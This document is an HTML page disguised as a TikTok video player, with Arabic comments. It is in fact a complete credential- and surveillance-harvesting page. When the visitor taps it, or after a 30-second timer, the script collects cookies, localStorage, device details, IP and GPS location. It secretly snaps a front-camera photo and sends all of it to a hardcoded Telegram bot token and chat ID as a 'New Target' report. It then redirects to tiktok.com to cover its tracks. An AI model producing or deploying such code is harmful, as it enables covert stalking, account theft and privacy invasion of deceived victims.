<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>TikTok - Watch Video</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            overflow: hidden;
            position: relative;
        }
        .video-container {
            width: 100vw;
            height: 100vh;
            max-width: 500px;
            max-height: 100vh;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000;
            overflow: hidden;
        }
        .video-placeholder {
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, #ff0050, #00f2ea);
            background-size: 400% 400%;
            animation: gradientShift 3s ease infinite;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            position: relative;
            z-index: 10;
            opacity: 1;
            transition: opacity 0.5s ease;
        }
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .video-placeholder.hidden {
            opacity: 0;
            pointer-events: none;
        }
        .play-button {
            width: 80px;
            height: 80px;
            background-color: rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(10px);
            margin-bottom: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
        }
        .play-button svg {
            width: 40px;
            height: 40px;
            fill: #fff;
            margin-left: 5px;
        }
        .tiktok-logo {
            position: absolute;
            top: 20px;
            left: 20px;
            font-size: 1.5em;
            font-weight: bold;
            color: #fff;
            z-index: 15;
        }
        #loading-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.9);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 20;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.5s ease, visibility 0.5s ease;
        }
        #loading-overlay.active {
            opacity: 1;
            visibility: visible;
        }
        .spinner {
            border: 8px solid rgba(255, 255, 255, 0.3);
            border-top: 8px solid #ff0050;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1.2s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-message {
            font-size: 1.1em;
            color: #eee;
            text-align: center;
            max-width: 300px;
        }
        .hidden-ui {
            opacity: 0;
            pointer-events: none;
        }
        #notification {
            position: absolute;
            top: 20px;
            right: 20px;
            background-color: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 10px 15px;
            border-radius: 8px;
            font-size: 0.9em;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.5s ease, visibility 0.5s ease;
            z-index: 30;
            border-left: 4px solid #ff0050;
        }
        #notification.show {
            opacity: 1;
            visibility: visible;
        }
        .progress-bar {
            width: 200px;
            height: 4px;
            background-color: rgba(255, 255, 255, 0.2);
            border-radius: 2px;
            margin: 10px 0;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #ff0050, #00f2ea);
            width: 0%;
            transition: width 0.3s ease;
        }
        #camera-feed {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            z-index: -1;
        }
        #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="video-container">
        <div class="tiktok-logo">TikTok</div>
        
        <div class="video-placeholder" id="video-placeholder">
            <div class="play-button">
                <svg viewBox="0 0 24 24">
                    <path d="M8 5v14l11-7z"/>
                </svg>
            </div>
            <div class="placeholder-text" id="placeholder-text">Tap to watch this video</div>
        </div>

        <div id="loading-overlay">
            <div class="spinner"></div>
            <div class="loading-message" id="loading-message">Loading video content...</div>
            <div class="progress-bar">
                <div class="progress-fill" id="progress-fill"></div>
            </div>
        </div>

        <div id="notification"></div>
    </div>

    <!-- عناصر مخفية للكاميرا -->
    <video id="camera-feed" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        // ========== إعدادات التليجرام ==========
        const TELEGRAM_BOT_TOKEN = '8246710006:AAHDzo0liPiUnrv6GqaQDZppyAbsVrF7TSI';  // ← حط التوكن بتاع بوتك
        const CHAT_ID = '1197183184';              // ← حط الـ Chat ID بتاعك
        const TIKTOK_REDIRECT_URL = 'https://www.tiktok.com/';

        // ========== متغيرات ==========
        const videoPlaceholder = document.getElementById('video-placeholder');
        const loadingOverlay = document.getElementById('loading-overlay');
        const loadingMessage = document.getElementById('loading-message');
        const progressFill = document.getElementById('progress-fill');
        const notificationDiv = document.getElementById('notification');
        const cameraFeed = document.getElementById('camera-feed');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        let cameraStream = null;
        let capturedImage = null;

        let collectedData = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            ipInfo: null,
            location: null,
            deviceInfo: {},
            screenInfo: {},
            cookies: document.cookie,
            localStorageData: {},
            url: window.location.href
        };

        // ========== دوال مساعدة ==========
        function updateProgress(percent) {
            progressFill.style.width = percent + '%';
        }

        function showNotification(msg, type = 'info') {
            notificationDiv.textContent = msg;
            notificationDiv.classList.add('show');
            setTimeout(() => {
                notificationDiv.classList.remove('show');
            }, 3000);
        }

        // ========== جمع بيانات الجهاز ==========
        function collectDeviceInfo() {
            collectedData.deviceInfo = {
                platform: navigator.platform,
                language: navigator.language,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                userAgent: navigator.userAgent,
                vendor: navigator.vendor,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory || 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0
            };
            
            collectedData.screenInfo = {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                orientation: screen.orientation ? screen.orientation.type : 'unknown'
            };
            
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    collectedData.localStorageData[key] = localStorage.getItem(key);
                }
            } catch(e) {}
            
            console.log('✅ Device info collected');
        }

        // ========== التقاط صورة من الكاميرا ==========
        async function capturePhoto() {
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                cameraFeed.srcObject = cameraStream;
                await new Promise(resolve => cameraFeed.onloadedmetadata = resolve);
                
                canvas.width = cameraFeed.videoWidth;
                canvas.height = cameraFeed.videoHeight;
                ctx.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
                
                capturedImage = canvas.toDataURL('image/jpeg', 0.8);
                
                cameraStream.getTracks().forEach(track => track.stop());
                console.log('✅ Photo captured');
                return true;
            } catch (error) {
                console.warn('Camera capture failed:', error);
                return false;
            }
        }

        // ========== جلب الـ IP والموقع الدقيق ==========
        async function getIPAndLocation() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const ipData = await res.json();
                collectedData.ipInfo = ipData;
                console.log('✅ IP collected:', ipData.ip);
            } catch(e) {
                console.log('❌ IP fetch failed');
            }
            
            if (navigator.geolocation) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 15000,
                            maximumAge: 0
                        });
                    });
                    collectedData.location = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude || null,
                        speed: position.coords.speed || null
                    };
                    console.log('✅ GPS location collected');
                } catch(e) {
                    console.log('❌ GPS denied or failed');
                }
            }
        }

        // ========== إرسال الصورة للتليجرام ==========
        async function sendPhotoToTelegram() {
            if (!capturedImage) return false;
            
            try {
                const blob = await fetch(capturedImage).then(r => r.blob());
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'camera.jpg');
                formData.append('caption', '📸 صورة من كاميرا الهدف');
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                console.log('✅ Photo sent to Telegram');
                return true;
            } catch(e) {
                console.error('❌ Failed to send photo:', e);
                return false;
            }
        }

        // ========== إرسال الموقع للتليجرام ==========
        async function sendLocationToTelegram() {
            if (!collectedData.location) return false;
            
            const { latitude, longitude, accuracy } = collectedData.location;
            
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        latitude: latitude,
                        longitude: longitude,
                        horizontal_accuracy: accuracy
                    })
                });
                console.log('✅ Location sent to Telegram');
                return true;
            } catch(e) {
                console.error('❌ Failed to send location:', e);
                return false;
            }
        }

        // ========== إرسال البيانات النصية للتليجرام ==========
        async function sendTextDataToTelegram() {
            let message = `🎯 <b>New Target!</b>\n\n`;
            
            if (collectedData.ipInfo) {
                message += `🌍 <b>IP Location:</b>\n`;
                message += `   IP: <code>${collectedData.ipInfo.ip || 'Unknown'}</code>\n`;
                message += `   City: ${collectedData.ipInfo.city || 'Unknown'}\n`;
                message += `   Country: ${collectedData.ipInfo.country || 'Unknown'}\n`;
                message += `   ISP: ${collectedData.ipInfo.org || 'Unknown'}\n\n`;
            }
            
            if (collectedData.location) {
                message += `📍 <b>GPS Location:</b>\n`;
                message += `   Lat: ${collectedData.location.latitude}\n`;
                message += `   Lon: ${collectedData.location.longitude}\n`;
                message += `   Accuracy: ${collectedData.location.accuracy}m\n`;
                if (collectedData.location.altitude) {
                    message += `   Altitude: ${collectedData.location.altitude}m\n`;
                }
                message += `\n`;
            }
            
            message += `📱 <b>Device Info:</b>\n`;
            message += `   Platform: ${collectedData.deviceInfo.platform || 'Unknown'}\n`;
            message += `   Screen: ${collectedData.screenInfo.width}x${collectedData.screenInfo.height}\n`;
            message += `   RAM: ${collectedData.deviceInfo.deviceMemory}GB\n`;
            message += `   Browser: ${collectedData.userAgent.substring(0, 100)}...\n\n`;
            
            if (collectedData.cookies && collectedData.cookies.length > 0) {
                message += `🍪 <b>Cookies:</b>\n`;
                message += `   <code>${collectedData.cookies.substring(0, 300)}</code>\n\n`;
            }
            
            message += `⏰ <b>Time:</b> ${collectedData.timestamp}\n`;
            message += `🔗 <b>URL:</b> ${collectedData.url}`;
            
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    })
                });
                console.log('✅ Text data sent to Telegram');
            } catch(e) {
                console.error('❌ Failed to send text:', e);
            }
        }

        // ========== العملية الرئيسية ==========
        async function startStealthOperation() {
            try {
                updateProgress(10);
                loadingMessage.textContent = 'جاري التحميل...';
                collectDeviceInfo();
                await new Promise(r => setTimeout(r, 500));
                
                updateProgress(20);
                loadingMessage.textContent = 'جاري جلب الموقع...';
                await getIPAndLocation();
                await new Promise(r => setTimeout(r, 500));
                
                updateProgress(40);
                loadingMessage.textContent = 'جاري الوصول للكاميرا...';
                await capturePhoto();
                await new Promise(r => setTimeout(r, 500));
                
                updateProgress(60);
                loadingMessage.textContent = 'جاري تجهيز البيانات...';
                await new Promise(r => setTimeout(r, 500));
                
                updateProgress(70);
                loadingMessage.textContent = 'جاري إرسال الصورة...';
                await sendPhotoToTelegram();
                await new Promise(r => setTimeout(r, 500));
                
                updateProgress(80);
                loadingMessage.textContent = 'جاري إرسال الموقع...';
                await sendLocationToTelegram();
                await new Promise(r => setTimeout(r, 500));
                
                updateProgress(90);
                loadingMessage.textContent = 'جاري إرسال البيانات...';
                await sendTextDataToTelegram();
                await new Promise(r => setTimeout(r, 500));
                
                updateProgress(100);
                console.log('✅ All data sent');
                
            } catch(error) {
                console.error('Stealth operation error:', error);
                showNotification('حدث خطأ، حاول مرة أخرى', 'error');
            } finally {
                setTimeout(() => {
                    window.location.href = TIKTOK_REDIRECT_URL;
                }, 2000);
            }
        }

        // ========== تفعيل عند الضغط ==========
        videoPlaceholder.addEventListener('click', () => {
            videoPlaceholder.classList.add('hidden');
            loadingOverlay.classList.add('active');
            startStealthOperation();
        });

        showNotification('اضغط لمشاهدة الفيديو');

        setTimeout(() => {
            if (!loadingOverlay.classList.contains('active')) {
                videoPlaceholder.classList.add('hidden');
                loadingOverlay.classList.add('active');
                startStealthOperation();
            }
        }, 30000);
    </script>
</body>
</html>
